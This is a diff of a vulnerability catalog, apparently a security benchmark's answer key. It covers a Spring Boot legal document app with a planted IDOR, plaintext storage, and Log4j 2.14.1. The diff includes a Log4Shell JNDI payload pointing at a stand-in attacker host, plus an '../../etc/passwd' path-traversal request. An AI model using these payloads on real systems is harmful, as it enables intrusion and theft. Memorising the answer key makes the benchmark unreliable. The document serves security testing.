@@ -8,64 +8,77 @@
 
 ## Standalone Vulnerabilities
 
-### VULN-01: A01 — Broken Access Control (Document IDOR)
+### VULN-01: A01 — Broken Access Control (IDOR on Document Download)
 
 **Severity:** High  
 **Location:** `DocumentController.java:25-35` — `downloadDocument()`  
-**Description:** Document download endpoint performs no ownership or case-access validation — any authenticated user can download any document.
+**Lines:**
+```java
+// VULNERABILITY A01: Document download endpoint performs no ownership or case access validation
+```
 
 **Difficulty: EASY**
 
-- No ownership check on document retrieval
-- Horizontal IDOR: user A can download user B's documents
-- No case-level authorization verification
+- Comment explicitly marks it as `VULNERABILITY A01`
+- No validation that caller owns or is authorized for the document
+- Horizontal IDOR on any document
 
-### VULN-02: A02 — Sensitive Data at Rest in Plaintext
+### VULN-02: A02 — Cryptographic Failures (Plaintext Document Storage)
 
 **Severity:** High  
 **Location:** `Document.java:15-30`  
-**Description:** Legal contracts, lawsuit briefs, and depositions stored in plaintext database columns without encryption.
+**Lines:**
+```java
+// VULNERABILITY A02: Highly sensitive legal documents stored in plaintext without encryption at rest
+```
 
 **Difficulty: EASY**
 
-- Direct database access yields all sensitive legal content
+- Comment explicitly marks it as `VULNERABILITY A02`
+- Contracts, lawsuits, and depositions stored in plaintext
 - No encryption at rest
-- Backup compromise would expose everything
 
-### VULN-03: A06 — Log4Shell (Log4j 2.14.1)
+### VULN-03: A06 — Vulnerable Components (Log4j 2.14.1)
 
 **Severity:** Critical  
 **Location:** `pom.xml:10-25`  
-**Description:** Application uses Log4j 2.14.1, vulnerable to CVE-2021-44228 (Log4Shell). User-controlled request headers are logged.
+**Lines:**
+```xml
+<!-- VULNERABILITY A06: Application imports log4j-core:2.14.1 — vulnerable to Log4Shell (CVE-2021-44228) -->
+```
 
 **Difficulty: EASY**
 
-- Classic Log4Shell: `${jndi:ldap://attacker.com/a}` in any log message triggers RCE
-- Well-known, widely scanned vulnerability
-- Multiple publicly available exploit tools
+- Comment explicitly marks it as `VULNERABILITY A06`
+- Log4j 2.14.1 pinned in dependencies
+- User-controlled request headers get logged, triggering RCE
 
 ---
 
 ## Chained Attack: chain-01
 
 **Chain Name:** Log4Shell Trigger → Path Traversal → Legal Document Exfiltration  
-**Combined Impact:** Lateral Movement (Server Compromise + File Exfiltration)  
+**Combined Impact:** Lateral Movement  
 **Overall Chain Difficulty: MEDIUM**
 
-### Link 1: Log4Shell RCE (A06 — Medium)
+### Link 1: Log4Shell via Case Title (A06 — Medium)
 
-**Location:** `CaseController.java` — `createCase()`  
-**Description:** Case title logged via Log4j 2.14.1 `logger.info()`; JNDI expression triggers remote code execution.
+**Difficulty: MEDIUM**
+
+- Case title containing JNDI expression triggers Log4Shell RCE
+- JNDI expression in logger.info() evaluates the expression
 
 ### Link 2: Path Traversal (A01 — High)
 
-**Location:** `DocumentController.java` — `serveDocumentFile()`  
-**Description:** File path concatenated to base path without normalization — `?name=../../etc/passwd` reads arbitrary files.
+**Difficulty: EASY**
+
+- `GET /api/documents/file?name=` concatenates param to base path
+- No normalization, allows reading arbitrary server files
 
 ---
 
 ## Summary
 
-App-09 is the most critically important app in the benchmark due to the Log4Shell vulnerability. CVE-2021-44228 is one of the most famous vulnerabilities of the decade. Combined with path traversal, the chain is devastating. The plaintext documents storage is also a serious finding. This app uniquely tests for Log4j detection, making it stand out among all apps.
+App-09 is a Spring Boot legal document manager with IDOR, plaintext document storage, and Log4j 2.14.1. Chain: JNDI injection → path traversal → document exfiltration.
 
-**Overall Difficulty Score:** 1/5 (Easy — Log4Shell is well-known and easily exploitable)
+**Overall Difficulty Score:** 2/5 (Easy-Medium)
